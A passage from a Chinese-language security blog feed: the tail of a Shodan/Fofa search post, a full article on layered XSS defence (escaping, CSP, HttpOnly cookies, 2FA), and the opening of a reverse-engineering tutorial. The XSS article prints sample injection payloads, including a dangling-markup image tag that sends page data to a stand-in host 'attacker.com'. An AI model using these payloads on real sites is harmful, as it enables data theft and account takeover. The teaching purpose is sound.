id=\"%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%BE%9E-shodan-%E6%88%96-fofa-%E8%A2%AB%E6%89%BE%E5%88%B0-%3F\">#</a> 如何避免從 Shodan 或 Fofa 被找到 ?</h4>\n<ol>\n<li>家用網路請避免使用固定 IP，固定IP等於是有個固定門牌，駭客想要攻擊也比較容易找到你，尤其是用搜尋引擎。</li>\n<li>有遠端服務需求的朋友避免使用帳密登入，盡量選擇憑證或公私鑰。</li>\n<li>網站建議架在雲端主機，像是 AWS 或 GCP 等，躲在大公司的保護傘下。</li>\n<li>Shodan 和 Fofa 的更新都不是即時的，所以不管是新服務上線或是防護措施更新一週後都要再次到搜尋引擎上確認是否會被找到。</li>\n</ol>\n<h4 id=\"shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F\"><a class=\"direct-link\" href=\"#shodan-%E6%88%96-fofa-%E4%BD%BF%E7%94%A8%E4%B8%8A%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E5%9C%B0%E6%96%B9-%3F\">#</a> Shodan 或 Fofa 使用上要注意的地方 ?</h4>\n<ol>\n<li>不管在 Shodan 或 Fofa 免費用戶每天的搜尋量上限都不高，測試過程中很容易超標導致無法繼續使用，所以平常使用時多加一些過濾條件，不只能提升準確度還可以避免太快到達上限，萬一還是超出額度話就只好建立一個新帳號才能繼續使用。</li>\n<li>Shodan 的搜尋方式網路上有很多範例可以參考，官方也有整理一些最常被使用的搜尋方式在 Explore 頁面(<a href=\"https://www.shodan.io/explore\">https://www.shodan.io/explore</a>)，不知道從何下手時不妨先看看別人怎麼找。</li>\n<li>Fofa 有跟 Google 類似的搜尋預測功能，可輸入較短的關鍵字後看看有沒有推薦的查詢方式，目標還不精確時非常實用。</li>\n<li>Fofa 的搜索結果中包含網站所以有些不同的結果是來自同一個 IP，建議計算數量時以獨立 IP 為準(Shodan 也是以 IP 數量來計算結果數)，通常 Fofa 找到的 IP 數量比 Shodan 多，Shodan 找不到問題時可以試試 Fofa。</li>\n<li>在搜尋結果常常會出現一個不太明顯的提醒，告訴你這個目標可能是honeypots，這時候注意不要連過去，很可能受到反擊或資訊竊取，最好從回應內容中找出與一般設備的差別，新增規則來過濾掉這些無用資訊。</li>\n</ol>\n<p><img src=\"/img/posts/nick/shodan-fofa/1____8dp4s__lb__bhrc__TYXey6A.png\" alt=\"\"></p>\n<p>如果對這類型技術有興趣的話記得幫忙拍手與分享，數量夠多，之後會再加開一篇分享更進階的用法與付費用戶才有的強大功能，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。</p>\n<h3 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> 名詞解釋</h3>\n<blockquote>\n<p>註 1 : 蜜罐 (honeypots)通常偽裝成看似有利用價值的<a href=\"https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF\" title=\"網路\">網路</a>、資料、<a href=\"https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6\" title=\"電腦\">電腦</a>系統，並故意設定了 弱點，用來吸引<a href=\"https://zh.wikipedia.org/wiki/%E9%A7%AD%E5%AE%A2\" title=\"駭客\">駭客</a>攻擊。由於蜜罐事實上並未對網路提供任何有價值的服務，所以任何對蜜罐的嘗試都是可疑的。蜜罐中還可能裝有監控軟體，用以監視駭客入侵後的舉動。</p>\n</blockquote>\n<h3 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h3>\n<blockquote>\n<p><a href=\"https://www.shodan.io/\">https://www.shodan.io/</a><br>\n<a href=\"https://fofa.so/\">https://fofa.so/</a></p>\n</blockquote>\n",
      "date_published": "2021-06-28T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/",
      "title": "淺談 XSS 攻擊與防禦的各個環節",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<!-- summary -->\n<p>談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。</p>\n<!-- summary -->\n<p>而我所謂的這些「環節」，也可以理解成不同的「關卡」。</p>\n<p>舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。</p>\n<p>而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」</p>\n<p>這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。</p>\n<p>假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 <code>&lt;img src=x onerror=alert(1)&gt;</code> 就會變得無效。</p>\n<p>若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。</p>\n<p>這時候還可以防守什麼呢？那就是試圖把損害控制到最低。</p>\n<p>以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。</p>\n<p>而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。</p>\n<p>接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%94%BB%E6%93%8A%E8%80%85%E5%9C%A8%E7%B6%B2%E7%AB%99%E6%A4%8D%E5%85%A5%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 第一關：阻止攻擊者在網站植入程式碼</h2>\n<p>要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：</p>\n<blockquote>\n<p>永遠不要相信使用者的輸入</p>\n</blockquote>\n<p>只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。</p>\n<p>舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。</p>\n<p>如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。</p>\n<p>這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。</p>\n<p>要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 <code>&lt;</code> 轉成 <code>&amp;lt</code>，這樣在畫面上看到的依然是 <code>&lt;</code>，但是對 parser 來說那並不是標籤開始的符號，而是文字的 <code>&lt;</code>，就不會被當作 HTML 標籤來解析。</p>\n<p>如此一來，就能防止攻擊者植入程式碼。</p>\n<p>不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：</p>\n<ol>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html\">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)</a></li>\n</ol>\n<p>假設你只有想到說要對標籤做跳脫，把 <code>&lt;&gt;</code> 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= avatar_url ?><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>&lt;?= nickname ?><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span><span class=\"token prolog\">&lt;?= nickname ?></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 <code>&lt;&gt;</code> 是不夠的，因為如果我讓 nickname 變成 <code>&quot; onload=&quot;alert(1)</code> 的話，結合起來就會變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>avatar_url<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span><span class=\"token punctuation\">></span></span>\" onload=\"alert(1)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>攻擊者可以利用 <code>&quot;</code> 關閉前面的屬性，然後創出一個新的屬性 <code>onload</code>，達成 HTML 標籤屬性利用的 XSS。</p>\n<p>所以常見的特殊符號像是 <code>&quot;'&lt;&gt;</code> 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629700-8743df00-d0f1-11eb-937b-910934140e96.png\" alt=\"xss1\"></p>\n<p>那這樣就打完收工了嗎？還沒。</p>\n<p>因為，在連結裡的內容又是另外一回事了，例如說：<code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>\n<p>有一種東西叫做 JavaScript pseudo-protocol，可以利用 <code>javascript:</code> 來執行 JS 程式碼，像是這樣：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>，在使用者點擊這個連結時，就會跳出 alert。</p>\n<p>而 <code>javascript:alert(1)</code> 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 <code>&quot;'&lt;&gt;&amp;</code>，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 <code>http://</code> 或是 <code>http://</code> 之類的。</p>\n<p>這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。</p>\n<p>有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」</p>\n<p>這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 <code>javascript:alert(1)</code> 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。</p>\n<p>React 在 v16.9 的時候就針對這個 case 新增了警告：<a href=\"https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls\">Deprecating javascript: URLs</a>，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。</p>\n<p>這邊有一些相關的討論：<a href=\"https://github.com/facebook/react/issues/16592\">React@16.9 block javascript:void(0); #16592</a> 與 <a href=\"https://github.com/facebook/react/issues/16382\">False-positive security precaution warning (javascript: URLs) #16382</a>，想看程式碼的話在這邊：<a href=\"https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js\">react/packages/react-dom/src/shared/sanitizeURL.js </a>。</p>\n<p>除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。</p>\n<p>因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。</p>\n<p>舉例來說，搜尋頁面的網址可能長這樣：<code>https://example.com/search?q=hello</code>，而在程式中是這樣寫的：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> q <span class=\"token operator\">=</span> <span class=\"token string\">'hello'</span> <span class=\"token comment\">// 從網址列拿下來的參數</span><br>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'.search'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> q</code></pre>\n<p>這時如果你把 q 換成 HTML：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。</p>\n<p>最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 或是 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a> 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。</p>\n<p>雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（<a href=\"https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\">Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass</a>）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：<a href=\"https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b\">防止 XSS 可能比想像中困難</a>。</p>\n<p>總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：</p>\n<ol>\n<li>意識到哪邊是使用者可以自己輸入資料的地方</li>\n<li>針對不同情境去做 XSS 的防禦</li>\n</ol>\n<p>也可以考慮導入現成的 <a href=\"https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/\">WAF</a>（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。<br>\n或是也可以關心一下這個比較新的東西：<a href=\"https://web.dev/trusted-types/\">Trusted Types</a>。</p>\n<h2 id=\"%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E9%98%BB%E6%AD%A2%E6%83%A1%E6%84%8F%E7%A8%8B%E5%BC%8F%E7%A2%BC%E8%A2%AB%E5%9F%B7%E8%A1%8C\">#</a> 第二關：阻止惡意程式碼被執行</h2>\n<p>假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。</p>\n<p>這一關的重點是 CSP，Content Security Policy。</p>\n<p>CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 <code>&lt;meta&gt;</code> tag 來指定頁面的 CSP 規則。</p>\n<p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\">Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span></code></pre>\n<p><code>self</code> 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629705-8f038380-d0f1-11eb-851d-04ed70c19317.png\" alt=\"xss2\"></p>\n<p>CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：<a href=\"https://content-security-policy.com/\">Content Security Policy Reference</a>。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：</p>\n<pre class=\"language-csp\"><code class=\"language-csp\"><span class=\"token directive keyword\">default-src</span> <span class=\"token safe selector\">'none'</span><br><br><span class=\"token directive keyword\">base-uri</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">block-all-mixed-content</span>;<br><br><span class=\"token directive keyword\">connect-src</span> <span class=\"token safe selector\">'self'</span> uploads.github.com www.githubstatus.com collector.githubapp.com<br>api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com<br>github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com<br>html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com/v1/events wss://alive.github.com<br><span class=\"token unsafe function\">*</span>.actions.githubusercontent.com wss://<span class=\"token unsafe function\">*</span>.actions.githubusercontent.com online.visualstudio.com/api/v1/locations<br>insights.github.com;<br><br><span class=\"token directive keyword\">font-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">form-action</span> <span class=\"token safe selector\">'self'</span> github.com gist.github.com;<br><br><span class=\"token directive keyword\">frame-ancestors</span> <span class=\"token safe selector\">'none'</span>;<br><br><span class=\"token directive keyword\">frame-src</span> render.githubusercontent.com;<br><br><span class=\"token directive keyword\">img-src</span> <span class=\"token safe selector\">'self'</span> data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com<br>secured-user-images.githubusercontent.com/ <span class=\"token unsafe function\">*</span>.githubusercontent.com;<br><br><span class=\"token directive keyword\">manifest-src</span> <span class=\"token safe selector\">'self'</span>;<br><br><span class=\"token directive keyword\">media-src</span> github.com user-images.githubusercontent.com/;<br><br><span class=\"token directive keyword\">script-src</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">style-src</span> <span class=\"token unsafe function\">'unsafe-inline'</span> github.githubassets.com;<br><br><span class=\"token directive keyword\">worker-src</span> github.com/socket-worker-3f088aa2.js gist.github.com/socket-worker-3f088aa2.js</code></pre>\n<p>想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 <a href=\"https://csp-evaluator.withgoogle.com/\">CSP Evaluator</a>，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。</p>\n<p>這邊可以看到 script-src 的值只有 <code>github.githubassets.com</code>。因為沒有 <code>unsafe-inline</code> 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 <code>github.githubassets.com</code> 這個來源引入，幾乎封死了執行 script 的路。</p>\n<p>而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 <a href=\"https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html\">A Wormable XSS on HackMD!</a> 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；<a href=\"https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md\">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> 則是用 Google Tag Manager 來繞。</p>\n<p>另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">Breaking XSS mitigations via Script gadgets</a>。</p>\n<p>那如果真的沒辦法執行 script，還有什麼可以做的呢？</p>\n<p>就算只是插入 HTML，也還是可以做事的。</p>\n<p>例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>。</p>\n<p>或者是插入 <code>&lt;img src=&quot;https://attacker.com?q=</code>（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://attacker.com?q=<br>&lt;div>user info&lt;/div><br>&lt;div>sensitive data&lt;/div><br>&lt;div class=<span class=\"token punctuation\">\"</span></span><span class=\"token attr-name\">test\"</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>藉由 src 沒有閉合的 <code>&quot;</code>，就可以拿到下一個 <code>&quot;</code> 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 <code>img-src</code> 的 CSP 規則也是有用處的，可以防止這類型的攻擊。</p>\n<p>或也可以結合 <a href=\"https://blog.huli.tw/2021/01/23/dom-clobbering/\">DOM Clobbering</a>，看看有沒有什麼地方可以攻擊。</p>\n<p>因此，就算不能執行 script，依然有其他攻擊手法可以用。</p>\n<p>GitHub 在 2017 年時有寫過一篇 <a href=\"https://github.blog/2017-01-19-githubs-post-csp-journey/\">GitHub’s post-CSP journey</a>，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 <a href=\"https://bounty.github.com/targets/csp.html\">GitHub CSP</a>，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。</p>\n<h2 id=\"%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E9%99%8D%E4%BD%8E-xss-%E6%94%BB%E6%93%8A%E4%B9%8B%E6%90%8D%E5%AE%B3\">#</a> 第三關：降低 XSS 攻擊之損害</h2>\n<p>如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。</p>\n<p>這邊我覺得有兩個面向可以去思考：</p>\n<ol>\n<li>避免攻擊者用受害者的身份登入</li>\n<li>避免攻擊者透過 XSS 進行比較重要的操作</li>\n</ol>\n<p>先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 <code>HttpOnly</code>，就能確保前端無法直接用 document.cookie 就取得 cookie。</p>\n<p>如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。</p>\n<p>再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。</p>\n<p>以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。</p>\n<p>這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。</p>\n<p><img src=\"https://user-images.githubusercontent.com/2755720/122629715-96c32800-d0f1-11eb-971b-10f405ebd010.png\" alt=\"xss3\"></p>\n<p>其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：</p>\n<ol>\n<li>自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？</li>\n<li>儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding</li>\n<li>CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？</li>\n<li>2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？</li>\n<li>忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？</li>\n</ol>\n<p>XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。</p>\n<p>在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。</p>\n<p>所以在防禦的時候必須注意到上面提的這些不同的環節，針對每個環節都去做防禦，設下多個防線。就算攻擊者可以突破第一關，可能也會被第二關的 CSP 擋下，無法執行 JS；就算第二關被破了，還有第三關守著，降低 XSS 的影響程度，不會因為一個漏洞就讓使用者的帳戶整個被搶走。</p>\n",
      "date_published": "2021-06-17T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/reverse-01/",
      "title": "Reverse Engineering 101 — Part 1",
      "content_html": "<!-- summary -->\n<!-- 很多人對逆向工程躍躍欲試卻不知道從何開始，又該具備哪些知識？這一篇文章會從逆向一個小程式，帶你建立基礎知識與想法！ -->\n<!-- summary -->\n<p>最近解一些 CTF 順便跟同事分享 Reversing 的一點基礎技巧，想說寫成文章分享一下。這篇是給技術小白的 Reversing 入門系列，零基礎第一課！</p>\n<p>本篇會用到的工具有：</p>\n<ol>\n<li>linux 或 Unix-like 作業系統</li>\n<li>GDB（GNU Debugger），一個不管靜態還是動態分析都很好用的 linux 內建工具</li>\n<li>滿滿的好奇心！</li>\n</ol>\n<h2 id=\"%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F\">#</a> 該如何開始？</h2>\n<p>以下以一個簡單的<a href=\"https://github.com/OneDegree-Global/medium-resources/tree/main/reverse-101\">小程式</a>為例。</p>\n<p>今天拿到一個未知的檔案，我們該從何下手呢？首先，要知道我們的目標是什麼樣的檔案。我們可以用 linux 內建的 <code>file</code> 指令來辨識檔案類型。</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/file.png\" /><figcaption><p>file 指令</p>\n</figcaption></figure></p>\n<p>例如從上圖中我們可以觀察到幾件事：</p>\n<ol>\n<li>\n<p>這是一個 ELF 檔案（Executable Linkable Format），是 Unix 系統上常見的 binary 執行檔、共用函式庫、或是 object code 類型，也意味這我們可以直接在 linux 系統上把他跑起來 <sup class=\"footnote-ref\"><a href=\"#fn1\" 